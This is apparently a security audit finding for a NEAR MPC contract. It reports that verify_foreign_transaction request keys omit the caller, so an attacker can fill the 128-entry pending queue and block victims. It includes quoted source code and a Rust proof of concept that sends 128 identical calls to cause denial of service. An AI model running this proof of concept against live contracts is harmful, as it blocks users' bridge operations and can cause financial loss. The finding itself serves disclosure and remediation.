### Title
Caller-Agnostic `verify_foreign_transaction` Request Key Enables Queue-Saturation DoS - (File: `crates/contract/src/lib.rs`)

### Summary
The `verify_foreign_transaction` endpoint stores pending requests under a key that excludes the caller's identity. Because the fan-out queue per key is bounded at `MAX_PENDING_REQUEST_FAN_OUT = 128`, an unprivileged attacker can spam 128 identical requests for any observable foreign transaction, saturating the queue and blocking every subsequent legitimate submission of that same request with `PendingRequestQueueFull`.

### Finding Description

**Root cause — caller-agnostic request key**

`sign()` derives a per-caller key by hashing the predecessor account ID into a `Tweak`:

```rust
// crates/contract/src/lib.rs ~L379
let request = SignatureRequest::new(
    request.domain_id,
    request.payload,
    &predecessor,   // ← caller identity baked into the key
    &request.path,
);
```

`SignatureRequest` therefore differs per caller even for identical payloads. [1](#0-0) 

`verify_foreign_transaction()` does **not** include the caller:

```rust
// crates/contract/src/lib.rs ~L549
let request = args_into_verify_foreign_tx_request(request);
```

`VerifyForeignTransactionRequest` contains only `(domain_id, payload_version, ForeignChainRpcRequest)` — no predecessor, no tweak. [2](#0-1) 

The contract itself acknowledges this design in a test comment: *"a different account would today be blocked from receiving a response by alice's submission"* — the fan-out feature was added to let multiple callers share one MPC round-trip, but the bounded queue cap creates the attack surface. [3](#0-2) 

**Bounded queue cap**

`push_pending_yield` panics with `PendingRequestQueueFull` once the queue for a given key reaches `MAX_PENDING_REQUEST_FAN_OUT = 128`:

```rust
// crates/contract/src/pending_requests.rs
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

pub(crate) fn push_pending_yield<K>(...) {
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(&RequestError::PendingRequestQueueFull { limit: MAX_PENDING_REQUEST_FAN_OUT }.to_string());
    }
    ...
}
``` [4](#0-3) 

**Attack path**

1. Attacker observes a foreign transaction (e.g., a Bitcoin `tx_id`) that a victim will want to verify on-chain.
2. Attacker front-runs by submitting 128 identical `verify_foreign_transaction` calls for that `(domain_id, payload_version, ForeignChainRpcRequest)` tuple, each with the minimum 1 yoctonear deposit.
3. The queue for that request key is now full.
4. The victim's `verify_foreign_transaction` call panics with `PendingRequestQueueFull` and is rejected.
5. The attacker can continuously refill the queue after each `respond_verify_foreign_tx` drain or timeout cycle, maintaining the DoS indefinitely at the cost of ~128 × gas per cycle.

The minimum deposit is only 1 yoctonear per call: [5](#0-4) 

### Impact Explanation

A victim user is permanently blocked from submitting a `verify_foreign_transaction` request for a specific foreign transaction as long as the attacker keeps the queue saturated. In the bridge context this means:

- A cross-chain operation that depends on the MPC network verifying a foreign transaction (e.g., proving an Ethereum deposit) cannot complete.
- Funds on the foreign chain may remain locked or the bridge flow may time out, causing direct financial loss to the victim.

This is a **request-lifecycle manipulation that breaks the production safety invariant** (every user who pays the deposit must be able to enqueue a request) without requiring network-level DoS or operator misconfiguration.

### Likelihood Explanation

- All foreign transaction requests are publicly visible on-chain; the attacker needs no privileged information.
- The cost per DoS cycle is 128 × (1 yoctonear + gas) — negligible on NEAR.
- No threshold collusion, TEE access, or key material is required; any unprivileged NEAR account can execute the attack.
- The attack is sustainable: after each `respond_verify_foreign_tx` drains the queue, the attacker can immediately refill it.

### Recommendation

Include the caller's identity in the `verify_foreign_transaction` request key, mirroring the `sign()` design. Derive a per-caller tweak from `(predecessor_id, derivation_path)` using the existing `derive_foreign_tx_tweak` helper (already documented in `docs/foreign-chain-transactions.md`) and embed it in `VerifyForeignTransactionRequest`. This makes each caller's queue entry independent, so an attacker cannot fill another user's slot. [6](#0-5) 

### Proof of Concept

```rust
// Attacker fills the queue for a specific Bitcoin tx before the victim can submit.
// Cost: 128 × (1 yoctonear + gas) ≈ negligible.

let victim_request = VerifyForeignTransactionRequestArgs {
    domain_id: foreign_tx_domain_id,
    payload_version: ForeignTxPayloadVersion::V1,
    request: ForeignChainRpcRequest::Bitcoin(BitcoinRpcRequest {
        tx_id: victim_bitcoin_tx_id,
        confirmations: 2.into(),
        extractors: vec![BitcoinExtractor::BlockHash],
    }),
};

// Attacker submits 128 identical requests (each costs 1 yoctonear + gas).
for _ in 0..128 {
    attacker_account
        .call(contract.id(), "verify_foreign_transaction")
        .args_json(json!({ "request": victim_request }))
        .deposit(NearToken::from_yoctonear(1))
        .max_gas()
        .transact()
        .await?;
}

// Victim's submission now panics: "Pending-request queue is full (limit: 128)".
let result = victim_account
    .call(contract.id(), "verify_foreign_transaction")
    .args_json(json!({ "request": victim_request }))
    .deposit(NearToken::from_yoctonear(1))
    .max_gas()
    .transact()
    .await?
    .into_result();

assert!(result.unwrap_err().to_string().contains("Pending-request queue is full"));
```

The `MAX_PENDING_REQUEST_FAN_OUT` constant and the panic path are confirmed by the existing unit test `add_signature_request__should_panic_when_pending_queue_is_full`. [7](#0-6)

### Citations

**File:** crates/near-mpc-crypto-types/src/sign.rs (L117-125)
```rust
impl SignatureRequest {
    pub fn new(domain: DomainId, payload: Payload, predecessor_id: &AccountId, path: &str) -> Self {
        let tweak = crate::kdf::derive_tweak(predecessor_id, path);
        SignatureRequest {
            domain_id: domain,
            tweak,
            payload,
        }
    }
```

**File:** crates/near-mpc-contract-interface/src/types/foreign_chain.rs (L124-128)
```rust
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

**File:** crates/contract/src/lib.rs (L100-104)
```rust
/// Minimum deposit required for sign requests
const MINIMUM_SIGN_REQUEST_DEPOSIT: NearToken = NearToken::from_yoctonear(1);

/// Minimum deposit required for CKD requests
const MINIMUM_CKD_REQUEST_DEPOSIT: NearToken = NearToken::from_yoctonear(1);
```

**File:** crates/contract/src/lib.rs (L519-557)
```rust
    pub fn verify_foreign_transaction(&mut self, request: VerifyForeignTransactionRequestArgs) {
        log!(
            "verify_foreign_transaction: predecessor={:?}, request={:?}",
            env::predecessor_account_id(),
            request
        );

        self.check_request_preconditions(
            request.domain_id,
            DomainPurpose::ForeignTx,
            Gas::from_tgas(self.config.sign_call_gas_attachment_requirement_tera_gas),
            MINIMUM_SIGN_REQUEST_DEPOSIT,
        );

        let requested_chain = request.request.chain();
        let supported_chains = self.get_supported_foreign_chains();
        if !supported_chains.contains(&requested_chain) {
            env::panic_str(
                &InvalidParameters::ForeignChainNotSupported {
                    requested: requested_chain,
                }
                .to_string(),
            );
        }

        let callback_gas = Gas::from_tgas(
            self.config
                .return_signature_and_clean_state_on_success_call_tera_gas,
        );

        let request = args_into_verify_foreign_tx_request(request);
        let callback_args = serde_json::to_vec(&(&request,)).unwrap();
        self.enqueue_yield_request(
            method_names::RETURN_VERIFY_FOREIGN_TX_AND_CLEAN_STATE_ON_SUCCESS,
            callback_args,
            callback_gas,
            move |this, id| this.add_verify_foreign_tx_request(request, id),
        );
    }
```

**File:** crates/contract/src/lib.rs (L3242-3244)
```rust
        // And: caller bob submits the identical request — a different account would today
        // be blocked from receiving a response by alice's submission.
        let bob = AccountId::from_str("bob.near").unwrap();
```

**File:** crates/contract/src/lib.rs (L3300-3345)
```rust
    #[test]
    fn add_signature_request__should_panic_when_pending_queue_is_full() {
        // Given: a contract with a queue already at the fan-out cap for some request key.
        let (context, mut contract, _) = basic_setup(Curve::Secp256k1, &mut OsRng);
        let signature_request = SignatureRequest::new(
            DomainId::default(),
            Payload::from_legacy_ecdsa([3u8; 32]),
            &context.predecessor_account_id,
            "m/44'\''/60'\''/0'\''/0/0",
        );
        for i in 0..MAX_PENDING_REQUEST_FAN_OUT {
            contract.add_signature_request(signature_request.clone(), [i; 32]);
        }
        assert_eq!(
            contract
                .pending_signature_requests
                .get(&signature_request)
                .map(|q| q.len()),
            Some(usize::from(MAX_PENDING_REQUEST_FAN_OUT)),
        );

        // When: one more append is attempted.
        let result = panic::catch_unwind(panic::AssertUnwindSafe(|| {
            contract.add_signature_request(signature_request.clone(), [0xff; 32]);
        }));

        // Then: it panics with the typed cap-exceeded error and leaves the queue untouched.
        let err = result.expect_err("appending past the cap should panic");
        let msg = err
            .downcast_ref::<String>()
            .map(String::as_str)
            .or_else(|| err.downcast_ref::<&str>().copied())
            .unwrap_or_default();
        assert!(
            msg.contains("Pending-request queue is full"),
            "unexpected panic message: {msg}",
        );
        assert_eq!(
            contract
                .pending_signature_requests
                .get(&signature_request)
                .map(|q| q.len()),
            Some(usize::from(MAX_PENDING_REQUEST_FAN_OUT)),
            "queue should not have grown past the cap",
        );
    }
```

**File:** crates/contract/src/pending_requests.rs (L37-59)
```rust
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

/// Append a yield index to the pending-request fan-out queue for `request`.
///
/// Panics with `RequestError::PendingRequestQueueFull` if the resulting queue would
/// exceed `MAX_PENDING_REQUEST_FAN_OUT`.
pub(crate) fn push_pending_yield<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: K,
    data_id: CryptoHash,
) where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(
            &RequestError::PendingRequestQueueFull {
                limit: MAX_PENDING_REQUEST_FAN_OUT,
            }
            .to_string(),
        );
    }
    queue.push(YieldIndex { data_id });
```
